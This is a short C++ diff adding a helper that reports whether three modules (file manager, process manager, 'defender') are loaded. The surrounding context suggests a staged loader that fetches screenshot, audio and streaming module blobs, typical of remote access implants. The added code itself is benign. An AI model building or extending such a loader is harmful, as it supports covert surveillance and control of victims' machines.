@@ -302,6 +302,16 @@ public:
     // Kick off a background thread that fetches every known module blob
     // (screenshot, audio, stream, filemgr, procmgr, defender). Safe to call
     // repeatedly — concurrent calls share the same thread once it finishes.
+    // Returns true if all three primary modules are already loaded (their
+    // command handlers registered in cmds_).  Used by prefetch retry logic
+    // and by monitoring code to know whether a retry is worth trying.
+    bool all_primary_modules_loaded() {
+        std::lock_guard<std::recursive_mutex> lk(mu_);
+        return modules_.count("filemgr") > 0
+            && modules_.count("procmgr") > 0
+            && modules_.count("defender") > 0;
+    }
+
     void prefetch_all_async() {
         if (prefetch_running_.exchange(true)) {
             stage1_log(2, "stage2: prefetch already running, skipping");
